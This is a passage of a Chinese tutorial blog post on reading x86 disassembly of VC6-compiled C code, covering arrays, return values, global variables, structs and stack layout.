class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1:        int b[5] = &#123;0&#125;;</span><br><span class="line">00401038   mov         dword ptr [ebp-14h],0</span><br><span class="line">0040103F   xor         eax,eax</span><br><span class="line">00401041   mov         dword ptr [ebp-10h],eax</span><br><span class="line">00401044   mov         dword ptr [ebp-0Ch],eax</span><br><span class="line">00401047   mov         dword ptr [ebp-8],eax</span><br><span class="line">0040104A   mov         dword ptr [ebp-4],eax</span><br><span class="line">; 再多一点会用stos循环</span><br></pre></td></tr></table></figure><p><strong>数组最重要的特点是等宽且连续</strong>，如果不是等宽的则很有可能是个结构体。</p><p>注意一下分配的缓冲区</p><p>如果有疑惑去写代码放到od里看，看看内存绝对就懂了。</p><h2 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">1:    int main(int argc, char* argv[])</span><br><span class="line">2:    &#123;</span><br><span class="line">0040D6F0   push        ebp</span><br><span class="line">0040D6F1   mov         ebp,esp</span><br><span class="line">0040D6F3   sub         esp,78h</span><br><span class="line">0040D6F6   push        ebx</span><br><span class="line">0040D6F7   push        esi</span><br><span class="line">0040D6F8   push        edi</span><br><span class="line">0040D6F9   lea         edi,[ebp-78h]</span><br><span class="line">0040D6FC   mov         ecx,1Eh</span><br><span class="line">0040D701   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D706   rep stos    dword ptr [edi]</span><br><span class="line">3:        int a[3][4] = &#123;</span><br><span class="line">4:            &#123;1,2,3,4&#125;,</span><br><span class="line">0040D708   mov         dword ptr [ebp-30h],1</span><br><span class="line">0040D70F   mov         dword ptr [ebp-2Ch],2</span><br><span class="line">0040D716   mov         dword ptr [ebp-28h],3</span><br><span class="line">0040D71D   mov         dword ptr [ebp-24h],4</span><br><span class="line">5:           &#123;5,6,7,8&#125;,</span><br><span class="line">0040D724   mov         dword ptr [ebp-20h],5</span><br><span class="line">0040D72B   mov         dword ptr [ebp-1Ch],6</span><br><span class="line">0040D732   mov         dword ptr [ebp-18h],7</span><br><span class="line">0040D739   mov         dword ptr [ebp-14h],8</span><br><span class="line">6:           &#123;9,10,11,12&#125;</span><br><span class="line">0040D740   mov         dword ptr [ebp-10h],9</span><br><span class="line">0040D747   mov         dword ptr [ebp-0Ch],0Ah</span><br><span class="line">0040D74E   mov         dword ptr [ebp-8],0Bh</span><br><span class="line">0040D755   mov         dword ptr [ebp-4],0Ch</span><br><span class="line">7:       &#125;;</span><br><span class="line">8:       for (int i = 0; i&lt;3; i++)&#123;</span><br><span class="line">0040D75C   mov         dword ptr [ebp-34h],0</span><br><span class="line">0040D763   jmp         main+7Eh (0040d76e)</span><br><span class="line">0040D765   mov         eax,dword ptr [ebp-34h]</span><br><span class="line">0040D768   add         eax,1</span><br><span class="line">0040D76B   mov         dword ptr [ebp-34h],eax</span><br><span class="line">0040D76E   cmp         dword ptr [ebp-34h],3</span><br><span class="line">0040D772   jge         main+0BEh (0040d7ae)</span><br><span class="line">9:           for(int b = 0; b&lt;4; b++)&#123;</span><br><span class="line">0040D774   mov         dword ptr [b],0</span><br><span class="line">0040D77B   jmp         main+96h (0040d786)</span><br><span class="line">0040D77D   mov         ecx,dword ptr [b]</span><br><span class="line">0040D780   add         ecx,1</span><br><span class="line">0040D783   mov         dword ptr [b],ecx</span><br><span class="line">0040D786   cmp         dword ptr [b],4</span><br><span class="line">0040D78A   jge         main+0BCh (0040d7ac)</span><br><span class="line">10:               printf(&quot;%d &quot;,a[i][b]);</span><br><span class="line">0040D78C   mov         edx,dword ptr [ebp-34h]</span><br><span class="line">0040D78F   shl         edx,4</span><br><span class="line">0040D792   lea         eax,[ebp+edx-30h]</span><br><span class="line">0040D796   mov         ecx,dword ptr [b]</span><br><span class="line">0040D799   mov         edx,dword ptr [eax+ecx*4]</span><br><span class="line">0040D79C   push        edx</span><br><span class="line">0040D79D   push        offset string &quot;Hello World!\n&quot; (0042201c)</span><br><span class="line">0040D7A2   call        printf (00401060)</span><br><span class="line">0040D7A7   add         esp,8</span><br><span class="line">11:           &#125;</span><br><span class="line">0040D7AA   jmp         main+8Dh (0040d77d)</span><br><span class="line">12:       &#125;</span><br><span class="line">0040D7AC   jmp         main+75h (0040d765)</span><br><span class="line">13:</span><br><span class="line">14:   &#125;</span><br><span class="line">0040D7AE   pop         edi</span><br><span class="line">0040D7AF   pop         esi</span><br><span class="line">0040D7B0   pop         ebx</span><br><span class="line">0040D7B1   add         esp,78h</span><br><span class="line">0040D7B4   cmp         ebp,esp</span><br><span class="line">0040D7B6   call        __chkesp (004010e0)</span><br><span class="line">0040D7BB   mov         esp,ebp</span><br><span class="line">0040D7BD   pop         ebp</span><br><span class="line">0040D7BE   ret</span><br></pre></td></tr></table></figure><br><h1 id="0x07-返回值"><a href="#0x07-返回值" class="headerlink" title="0x07 返回值"></a>0x07 返回值</h1><h2 id="char类型"><a href="#char类型" class="headerlink" title="char类型"></a>char类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        char a = 0x12;</span><br><span class="line">00401038   mov         byte ptr [ebp-4],12h</span><br><span class="line">2:        return a;</span><br><span class="line">0040103C   mov         al,byte ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       char b=a();</span><br><span class="line">00401078   call        @ILT+10(a) (0040100f)</span><br><span class="line">0040107D   mov         byte ptr [ebp-4],al</span><br></pre></td></tr></table></figure><h2 id="int类型"><a href="#int类型" class="headerlink" title="int类型"></a>int类型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        int a = 0x12345678;</span><br><span class="line">00401038   mov         dword ptr [ebp-4],12345678h</span><br><span class="line">2:        return a;</span><br><span class="line">0040103F   mov         eax,dword ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       int b=a();</span><br><span class="line">00401078   call        @ILT+0(a) (00401005)</span><br><span class="line">0040107D   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure><h2 id="long-long"><a href="#long-long" class="headerlink" title="long long"></a>long long</h2><p>__int64就是vc6的long long类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; a函数</span><br><span class="line">1:        __int64 a = 0x12345678;</span><br><span class="line">00401038   mov         dword ptr [ebp-8],12345678h</span><br><span class="line">0040103F   mov         dword ptr [ebp-4],0</span><br><span class="line">2:        return a;</span><br><span class="line">00401046   mov         eax,dword ptr [ebp-8]</span><br><span class="line">00401049   mov         edx,dword ptr [ebp-4]</span><br><span class="line">; main函数</span><br><span class="line">3:       __int64 b=a();</span><br><span class="line">00401078   call        @ILT+20(a) (00401019)</span><br><span class="line">0040107D   mov         dword ptr [ebp-8],eax</span><br><span class="line">00401080   mov         dword ptr [ebp-4],edx</span><br></pre></td></tr></table></figure><p>高位存在edx，低位存在eax。</p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><ul><li>就算宽度小于四字节（char），也会把值存在四字节中。</li><li>如果有疑惑去写代码放到od里看，看看内存绝对就懂了。</li><li>char类型或者short类型的参数没有节省空间，整数类型的参数，一律使用int类型。</li></ul><br><h1 id="0x08-全局变量"><a href="#0x08-全局变量" class="headerlink" title="0x08 全局变量"></a>0x08 全局变量</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1:    int a = 21;</span><br><span class="line">2:</span><br><span class="line">3:    int main(int argc, char* argv[])</span><br><span class="line">4:    &#123;</span><br><span class="line">0040D6F0   push        ebp</span><br><span class="line">0040D6F1   mov         ebp,esp</span><br><span class="line">0040D6F3   sub         esp,40h</span><br><span class="line">0040D6F6   push        ebx</span><br><span class="line">0040D6F7   push        esi</span><br><span class="line">0040D6F8   push        edi</span><br><span class="line">0040D6F9   lea         edi,[ebp-40h]</span><br><span class="line">0040D6FC   mov         ecx,10h</span><br><span class="line">0040D701   mov         eax,0CCCCCCCCh</span><br><span class="line">0040D706   rep stos    dword ptr [edi]</span><br><span class="line">5:        a = 22;</span><br><span class="line">0040D708   mov         dword ptr [a (00424d8c)],16h</span><br></pre></td></tr></table></figure><p>全局变量在程序编译完成后地址就已经确定下来了</p><br><h1 id="0x09-结构体"><a href="#0x09-结构体" class="headerlink" title="0x09 结构体"></a>0x09 结构体</h1><h2 id="定义全局变量（基值）"><a href="#定义全局变量（基值）" class="headerlink" title="定义全局变量（基值）"></a>定义全局变量（基值）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">; 结构体</span><br><span class="line">1:    struct SOS</span><br><span class="line">2:    &#123;</span><br><span class="line">3:        int a;</span><br><span class="line">4:        short b;</span><br><span class="line">5:        char c;</span><br><span class="line">6:   &#125;;</span><br><span class="line">7:   SOS x;</span><br><span class="line"></span><br><span class="line">; main函数</span><br><span class="line">8:   int main()&#123;</span><br><span class="line">004109D0   push        ebp</span><br><span class="line">004109D1   mov         ebp,esp</span><br><span class="line">004109D3   sub         esp,40h</span><br><span class="line">004109D6   push        ebx</span><br><span class="line">004109D7   push        esi</span><br><span class="line">004109D8   push        edi</span><br><span class="line">004109D9   lea         edi,[ebp-40h]</span><br><span class="line">004109DC   mov         ecx,10h</span><br><span class="line">004109E1   mov         eax,0CCCCCCCCh</span><br><span class="line">004109E6   rep stos    dword ptr [edi]</span><br><span class="line">9:       fun();</span><br><span class="line">004109E8   call        @ILT+15(fun) (00401014)</span><br><span class="line">10:       fun2();</span><br><span class="line">004109ED   call        @ILT+10(fun) (0040100f)</span><br><span class="line">11:       return 0;</span><br><span class="line">004109F2   xor         eax,eax</span><br><span class="line">12:   &#125;</span><br><span class="line">004109F4   pop         edi</span><br><span class="line">004109F5   pop         esi</span><br><span class="line">004109F6   pop         ebx</span><br><span class="line">004109F7   add         esp,40h</span><br><span class="line">004109FA   cmp         ebp,esp</span><br><span class="line">004109FC   call        __chkesp (004106a0)</span><br><span class="line">00410A01   mov         esp,ebp</span><br><span class="line">00410A03   pop         ebp</span><br><span class="line">00410A04   ret</span><br><span class="line"></span><br><span class="line">; fun函数</span><br><span class="line">13:   void fun()</span><br><span class="line">14:   &#123;</span><br><span class="line">004106E0   push        ebp</span><br><span class="line">004106E1   mov         ebp,esp</span><br><span class="line">004106E3   sub         esp,40h</span><br><span class="line">004106E6   push        ebx</span><br><span class="line">004106E7   push        esi</span><br><span class="line">004106E8   push        edi</span><br><span class="line">004106E9   lea         edi,[ebp-40h]</span><br><span class="line">004106EC   mov         ecx,10h</span><br><span class="line">004106F1   mov         eax,0CCCCCCCCh</span><br><span class="line">004106F6   rep stos    dword ptr [edi]</span><br><span class="line">15:       x.a = 1;</span><br><span class="line">004106F8   mov         dword ptr [x (0042c230)],1</span><br><span class="line">16:       x.b = 2;</span><br><span class="line">00410702   mov         word ptr [x+4 (0042c234)],offset fun+29h (00410709)</span><br><span class="line">17:       x.c = 3;</span><br><span class="line">0041070B   mov         byte ptr [x+6 (0042c236)],3</span><br><span class="line">18:   &#125;</span><br><span class="line">00410712   pop         edi</span><br><span class="line">00410713   pop         esi</span><br><span class="line">00410714   pop         ebx</span><br><span class="line">00410715   mov         esp,ebp</span><br><span class="line">00410717   pop         ebp</span><br><span class="line">00410718   ret</span><br><span class="line"></span><br><span class="line">; fun2函数</span><br><span class="line">19:   void fun2()&#123;</span><br><span class="line">00410630   push        ebp</span><br><span class="line">00410631   mov         ebp,esp</span><br><span class="line">00410633   sub         esp,40h</span><br><span class="line">00410636   push        ebx</span><br><span class="line">00410637   push        esi</span><br><span class="line">00410638   push        edi</span><br><span class="line">00410639   lea         edi,[ebp-40h]</span><br><span class="line">0041063C   mov         ecx,10h</span><br><span class="line">00410641   mov         eax,0CCCCCCCCh</span><br><span class="line">00410646   rep stos    dword ptr [edi]</span><br><span class="line">20:       printf(&quot;%d,%d,%d&quot;,x.a,x.b,x.c);</span><br><span class="line">00410648   movsx       eax,byte ptr [x+6 (0042c236)]</span><br><span class="line">0041064F   push        eax</span><br><span class="line">00410650   movsx       ecx,word ptr [x+4 (0042c234)]</span><br><span class="line">00410657   push        ecx</span><br><span class="line">00410658   mov         edx,dword ptr [x (0042c230)]</span><br><span class="line">0041065E   push        edx</span><br><span class="line">0041065F   push        offset string &quot;%d,%d,%d&quot; (00427004)</span><br><span class="line">00410664   call        printf (00410950)</span><br><span class="line">00410669   add         esp,10h</span><br><span class="line">21:   &#125;</span><br><span class="line">0041066C   pop         edi</span><br><span class="line">0041066D   pop         esi</span><br><span class="line">0041066E   pop         ebx</span><br><span class="line">0041066F   add         esp,40h</span><br><span class="line">00410672   cmp         ebp,esp</span><br><span class="line">00410674   call        __chkesp (004106a0)</span><br><span class="line">00410679   mov         esp,ebp</span><br><span class="line">0041067B   pop         ebp</span><br><span class="line">0041067C   ret</span><br></pre></td></tr></table></figure><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; fun函数</span><br><span class="line">; x变成局部变量</span><br><span class="line">1:   &#123;</span><br><span class="line">004106E0   push        ebp</span><br><span class="line">004106E1   mov         ebp,esp</span><br><span class="line">004106E3   sub         esp,48h</span><br><span class="line">004106E6   push        ebx</span><br><span class="line">004106E7   push        esi</span><br><span class="line">004106E8   push        edi</span><br><span class="line">004106E9   lea         edi,[ebp-48h]</span><br><span class="line">004106EC   mov         ecx,12h</span><br><span class="line">004106F1   mov         eax,0CCCCCCCCh</span><br><span class="line">004106F6   rep stos    dword ptr [edi]</span><br><span class="line">2:       SOS x;</span><br><span class="line">3:       x.a = 1;</span><br><span class="line">004106F8   mov         dword ptr [ebp-8],1</span><br><span class="line">4:       x.b = 2;</span><br><span class="line">004106FF   mov         word ptr [ebp-4],offset fun+23h (00410703)</span><br><span class="line">5:       x.c = 3;</span><br><span class="line">00410705   mov         byte ptr [ebp-2],3</span><br><span class="line">6:   &#125;</span><br></pre></td></tr></table></figure><h2 id="函数返回（参数较少）（没超过两字节）"><a href="#函数返回（参数较少）（没超过两字节）" class="headerlink" title="函数返回（参数较少）（没超过两字节）"></a>函数返回（参数较少）（没超过两字节）</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AAA</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">AAA <span class="title">fff</span><span class="params">(AAA d)</span></span>&#123;</span><br><span class="line">    d.a = <span class="number">1</span>;</span><br><span class="line">    d.b = <span class="number">2</span>;</span><br><span class="line">    d.c = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    AAA e;</span><br><span class="line">    <span class="built_in">fff</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">; main函数</span><br><span class="line">1:       AAA e;</span><br><span class="line">2:       fff(e);</span><br><span class="line">0040D708   mov         eax,dword ptr [ebp-4];bc</span><br><span class="line">0040D70B   push        eax</span><br><span class="line">0040D70C   mov         ecx,dword ptr [ebp-8];a</span><br><span class="line">0040D70F   push        ecx</span><br><span class="line">0040D710   call        @ILT+5(fff) (0040100a)</span><br><span class="line">0040D715   add         esp,8</span><br><span class="line">0040D718   mov         dword ptr [ebp-10h],eax</span><br><span class="line">0040D71B   mov         dword ptr [ebp-0Ch],edx</span><br><span class="line"></span><br><span class="line">; AAA</span><br><span class="line">3:    struct AAA&#123;</span><br><span class="line">4:        int a;</span><br><span class="line">5:        short b;</span><br><span class="line">6:        char c;</span><br><span class="line">7:   &#125;;</span><br><span class="line">8:   AAA fff(AAA d)&#123;</span><br><span class="line">00401010   push        ebp</span><br><span class="line">00401011   mov         ebp,esp</span><br><span class="line">00401013   sub         esp,40h</span><br><span class="line">00401016   push        ebx</span><br><span class="line">00401017   push        esi</span><br><span class="line">00401018   push        edi</span><br><span class="line">00401019   lea         edi,[ebp-40h]</span><br><span class="line">0040101C   mov         ecx,10h</span><br><span class="line">00401021   mov         eax,0CCCCCCCCh</span><br><span class="line">00401026   rep stos    dword ptr [edi]</span><br><span class="line">9:       d.a = 1;</span><br><span class="line">00401028   mov         dword ptr [ebp+8],1</span><br><span class="line">10:       d.b = 2;</span><br><span class="line">0040102F   mov         word ptr [ebp+0Ch],offset fff+23h (00401033)</span><br><span class="line">11:       d.c = 3;</span><br><span class="line">00401035   mov         byte ptr [ebp+0Eh],3</span><br><span class="line">12:       return d;</span><br><span class="line">00401039   mov         eax,dword ptr [ebp+8]</span><br><span class="line">0040103C   mov         edx,dword ptr [ebp+0Ch]</span><br><span class="line">13:   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ebp</span><br><span class="line">返回值</span><br><span class="line">push ecx</span><br><span class="line">push eax</span><br><span class="line">cccc</span><br><span class="line">ecx a -8</span><br><span class="line">eax bc -4</span><br><span class="line">原ebp</span><br></pre></td></tr></table></figure><p>全局变量和这个没啥区别</p><h2 id="函数返回（参数较多）（超过两字节）"><a href="#函数返回（参数较多）（超过两字节）" class="headerlink" title="函数返回（参数较多）（超过两字节）"></a>函数返回（参数较多）（超过两字节）</h2><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AAA</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">short</span> b;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">AAA <span class="title">fff</span><span class="params">(AAA e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    AAA f;</span><br><span class="line">    <span class="built_in">fff</span>(f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">; main</span><br><span class="line">1:       AAA f;</span><br><span class="line">2:       fff(f);</span><br><span class="line">0040D708   sub         esp,0Ch</span><br><span class="line">0040D70B   mov         eax,esp</span><br><span class="line">0040D70D   mov         ecx,dword ptr [ebp-0Ch];a</span><br><span class="line">0040D710   mov         dword ptr [eax],ecx</span><br><span class="line">0040D712   mov         edx,dword ptr [ebp-8];bc</span><br><span class="line">0040D715   mov         dword ptr [eax+4],edx</span><br><span class="line">0040D718   mov         ecx,dword ptr [ebp-4];d</span><br><span class="line">0040D71B   mov         dword ptr [eax+8],ecx</span><br><span class="line">0040D71E   lea         edx,[ebp-24h]</span><br><span class="line">0040D721   push        edx</span><br><span class="line">0040D722   call        @ILT+5(fff) (0040100a)</span><br><span class="line">0040D727   add         esp,10h</span><br><span class="line">0040D72A   mov         ecx,dword ptr [eax]</span><br><span class="line">0040D72C   mov         dword ptr [ebp-18h],ecx</span><br><span class="line">0040D72F   mov         edx,dword ptr [eax+4]</span><br><span class="line">0040D732   mov         dword ptr [ebp-14h],edx</span><br><span class="line">0040D735   mov         eax,dword ptr [eax+8]</span><br><span class="line">0040D738   mov         dword ptr [ebp-10h],eax</span><br></pre></td></tr></table></figure><p>建议看着堆栈图来理解。这里没有push而是直接复制进了esp。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1:   AAA fff(AAA e)&#123;</span><br><span class="line">00401010   push        ebp</span><br><span class="line">00401011   mov         ebp,esp</span><br><span class="line">00401013   sub         esp,40h</span><br><span class="line">00401016   push        ebx</span><br><span class="line">00401017   push        esi</span><br><span class="line">00401018   push        edi</span><br><span class="line">00401019   lea         edi,[ebp-40h]</span><br><span class="line">0040101C   mov         ecx,10h</span><br><span class="line">00401021   mov         eax,0CCCCCCCCh</span><br><span class="line">00401026   rep stos    dword ptr [edi]</span><br><span class="line">2:       return e;</span><br><span class="line">00401028   mov         eax,dword ptr [ebp+8]</span><br><span class="line">0040102B   mov         ecx,dword ptr [ebp+0Ch]</span><br><span class="line">0040102E   mov         dword ptr [eax],ecx</span><br><span class="line">00401030   mov         edx,dword ptr [ebp+10h]</span><br><span class="line">00401033   mov         dword ptr [eax+4],edx</span><br><span class="line">00401036   mov         ecx,dword ptr [ebp+14h]</span><br><span class="line">00401039   mov         dword ptr [eax+8],ecx</span><br><span class="line">0040103C   mov         eax,dword ptr [ebp+8]</span><br></pre></td></tr></table></figure><p>此时的堆栈是这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int3缓冲区</span><br><span class="line">ebp</span><br><span class="line">返回地址</span><br><span class="line">ebp-24h</span><br><span class="line">参数int a</span><br><span class="line">参数short char</span><br><span class="line">参数int d</span><br><span class="line">ccc</span><br><span class="line">-0c a</span><br><span class="line">-8 